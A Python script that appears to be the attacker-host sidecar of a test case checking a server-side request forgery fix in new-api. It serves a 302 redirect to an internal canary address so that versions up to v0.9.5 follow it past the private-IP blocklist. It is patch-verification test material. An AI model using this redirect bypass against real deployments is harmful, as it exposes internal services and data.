#!/usr/bin/env python3
"""
Attacker-controlled host sidecar for the new-api SSRF PatchClosure case.

Lives on the "public" `pub` docker network (11.11.11.10) -- an IP range that is
NOT in new-api's private/reserved blocklist, so new-api's SSRF guard treats it
as a legitimate external host and allows the initial request. It listens on
:8080, one of new-api's default allowed ports (80/443/8080/8443).

Endpoint /redirect returns an HTTP 302 whose Location points at the INTERNAL
canary (a private IP). new-api (<= v0.9.5) follows that redirect without
re-validating the target -> intranet SSRF. v0.9.6 re-validates each redirect
hop and blocks it.
"""
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# The internal canary target the 302 points to (private IP:port).
REDIRECT_TARGET = os.environ.get(
    "REDIRECT_TARGET", "http://172.31.9.9:80/internal-secret.png"
)


class Handler(BaseHTTPRequestHandler):
    def _do(self):
        if self.path.startswith("/redirect"):
            self.send_response(302)
            self.send_header("Location", REDIRECT_TARGET)
            self.send_header("Content-Length", "0")
            self.end_headers()
            print("302 -> {}".format(REDIRECT_TARGET), flush=True)
            return
        # Benign default page (proves the attacker host itself is allowed).
        body = b"attacker host ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_GET(self):
        self._do()

    def do_HEAD(self):
        self._do()

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print("attacker listening on :8080, redirect_target={}".format(REDIRECT_TARGET), flush=True)
    ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
